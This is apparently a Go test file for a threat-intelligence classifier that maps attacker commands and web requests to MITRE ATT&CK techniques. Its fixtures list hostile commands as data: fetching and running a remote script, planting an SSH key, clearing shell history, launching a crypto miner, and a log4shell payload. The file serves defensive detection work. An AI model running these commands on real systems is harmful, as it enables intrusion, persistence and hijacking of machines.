package intel

import "testing"

func has(ts []Technique, id string) bool {
	for _, t := range ts {
		if t.ID == id {
			return true
		}
	}
	return false
}

func TestClassifyCommand(t *testing.T) {
	cases := []struct {
		cmd  string
		cat  string
		tech string
	}{
		{"wget http://1.2.3.4/x.sh -O /tmp/x", "download", "T1105"},
		{"chmod +x /tmp/x && ./x", "execution", "T1222.002"},
		{"cat /proc/cpuinfo | grep name", "recon", "T1082"},
		{"echo ssh-rsa AAAA mdrfckr >> ~/.ssh/authorized_keys", "persistence", "T1098.004"},
		{"history -c", "evasion", "T1070.003"},
		{"./xmrig -o stratum+tcp://pool:3333", "miner", "T1496"},
	}
	for _, c := range cases {
		cats, techs := ClassifyCommand(c.cmd)
		if !has(techs, c.tech) {
			t.Errorf("%q: missing technique %s (got %v)", c.cmd, c.tech, techs)
		}
		if PrimaryCategory(cats) == "other" {
			t.Errorf("%q: classified as other", c.cmd)
		}
	}
	if cats, _ := ClassifyCommand("hello"); cats[0] != "other" {
		t.Errorf("benign text should be other, got %v", cats)
	}
}

func TestClassifyWeb(t *testing.T) {
	if _, tech := ClassifyWeb("/?x=${jndi:ldap://a/b}"); tech.ID != "T1190" {
		t.Errorf("log4shell should map to T1190, got %s", tech.ID)
	}
	if l, _ := ClassifyWeb("/wp-login.php"); l != "WordPress probe" {
		t.Errorf("got %q", l)
	}
}

func TestNormalizeCommandCollapsesVolatileParts(t *testing.T) {
	a := NormalizeCommand("wget http://10.1.2.3:8080/a.sh")
	b := NormalizeCommand("wget http://198.51.100.9:81/a.sh")
	if a != b {
		t.Errorf("expected identical normalization, got %q vs %q", a, b)
	}
}
